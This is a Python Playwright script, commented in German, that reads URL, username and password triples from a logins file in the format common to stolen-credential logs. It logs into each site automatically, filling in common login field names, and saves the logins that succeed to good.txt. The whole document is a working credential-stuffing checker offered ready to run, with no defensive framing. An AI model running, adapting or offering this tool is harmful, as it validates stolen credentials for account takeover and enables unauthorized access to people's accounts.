from playwright.sync_api import sync_playwright
import time
from urllib.parse import urlparse

input_file = "logins.txt"
good_file = "good.txt"
output_file = "output.txt"
successful_identifier = "successful_login_identifier"  # Ihr tatsächlicher Erfolgsindikator

# Hilfsfunktionen
def ensure_url_scheme(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url
    return url

def is_valid_url(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)

def is_relevant_line(line):
    return any(keyword in line for keyword in ["URL:", "USER:", "Username:", "PASS:", "Password:"])

def is_url_line(line):
    return line.startswith("URL:")

def is_user_line(line):
    return line.startswith("USER:") or line.startswith("Username:")

def is_pass_line(line):
    return line.startswith("PASS:") or line.startswith("Password:")

def log_output(message, file_handle):
    trimmed_message = (message[:497] + '...') if len(message) > 500 else message
    print(trimmed_message)  # Ausgabe auf der Konsole
    file_handle.write(trimmed_message + '\n')

def process_login_playwright(page, url, username, password, output_handle, good_handle):
    url = ensure_url_scheme(url)
    if not is_valid_url(url):
        log_output(f"Ungültige URL: {url}", output_handle)
        return

    try:
        log_output(f"Versuche, zu navigieren: {url}", output_handle)
        page.goto(url)
        log_output(f"Erfolgreich zu: {url} navigiert", output_handle)

        # Cookie-Banner wegklicken, wenn vorhanden
        try:
            cookie_button = page.wait_for_selector("//button[text()='Accept' or text()='I agree']", timeout=5000)
            cookie_button.click()
            log_output("Cookie-Banner weggeklickt", output_handle)
        except Exception as e:
            log_output(f"Kein Cookie-Banner gefunden oder Fehler beim Wegklicken: {e}", output_handle)

        # Versuch zum Finden verschiedener Login-Felder Heuristik-basiert
        login_inputs = [
            (page.locator("input[name='username']"), page.locator("input[name='password']")),
            (page.locator("input[name='user']"), page.locator("input[name='pass']")),
            (page.locator("input[name='email']"), page.locator("input[name='password']"))
        ]

        login_submit = [
            page.locator("input[type='submit']"),
            page.locator("button[type='submit']"),
            page.locator("button[name='login']"),
            page.locator("button:text('Login')"),
            page.locator("button:text('Sign In')"),
        ]

        found_login = False
        for user_input, pass_input in login_inputs:
            if user_input.is_visible() and pass_input.is_visible():
                log_output(f"Benutzername- und Passwort-Felder auf {url} gefunden", output_handle)
                user_input.fill(username)
                pass_input.fill(password)
                found_login = True
                break

        if not found_login:
            log_output(f"Konnte keine vollständigen Login-Elemente auf {url} finden", output_handle)
            return

        found_submit = False
        for submit_btn in login_submit:
            if submit_btn.is_visible():
                submit_btn.click()
                log_output(f"Login-Button auf {url} geklickt", output_handle)
                found_submit = True
                break

        if not found_submit:
            log_output(f"Kein Login-Button auf {url} gefunden", output_handle)
            return

        time.sleep(5)  # Warte auf das Laden der Seite

        log_output(f"Überprüfung der Seite nach dem Login-Versuch auf {url}", output_handle)

        # Überprüfen, ob die Anmeldung erfolgreich war
        if successful_identifier in page.content():
            log_output(f"Login erfolgreich für {url}", output_handle)
            good_handle.write(f"URL: {url}\nUSER: {username}\nPASS: {password}\n")
        else:
            log_output(f"Login fehlgeschlagen für {url}", output_handle)
    except Exception as e:
        log_output(f"Fehler beim Verarbeiten der URL: {url}\nGrund: {e}", output_handle)

# Startdatum und Zeit
start_time = time.time()

with open(good_file, "w") as good, open(output_file, "w") as output:
    with open(input_file, "r", encoding="ISO-8859-1") as file:
        lines_buffer = []
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=False)  # Headless=False öffnet den Browser
            page = browser.new_page()

            try:
                for line_num, line in enumerate(file, start=1):
                    line = line.strip()
                    if not line or not is_relevant_line(line):
                        continue

                    if is_url_line(line):
                        lines_buffer = [line]
                    elif lines_buffer and is_user_line(line):
                        lines_buffer.append(line)
                    elif lines_buffer and len(lines_buffer) == 2 and is_pass_line(line):
                        lines_buffer.append(line)

                    if len(lines_buffer) == 3:
                        url = lines_buffer[0].split("URL:")[1].strip()
                        username = lines_buffer[1].split("USER:")[1].strip() if "USER:" in lines_buffer[1] else lines_buffer[1].split("Username:")[1].strip()
                        password = lines_buffer[2].split("PASS:")[1].strip() if "PASS:" in lines_buffer[2] else lines_buffer[2].split("Password:")[1].strip()

                        log_output(f"Verarbeite URL: {url} mit Benutzer: {username}", output)  # Debugging-Ausgabe
                        process_login_playwright(page, url, username, password, output, good)
                        lines_buffer.clear()

                log_output("Alle Anfragen bearbeitet. Browserfenster bleibt für weitere Prüfungen offen.", output)
                input("Drücken Sie Enter, um das Skript zu beenden...")

            finally:
                browser.close()

end_time = time.time()
execution_time = end_time - start_time
print(f"Die Laufzeit des Skripts beträgt {execution_time} Sekunden")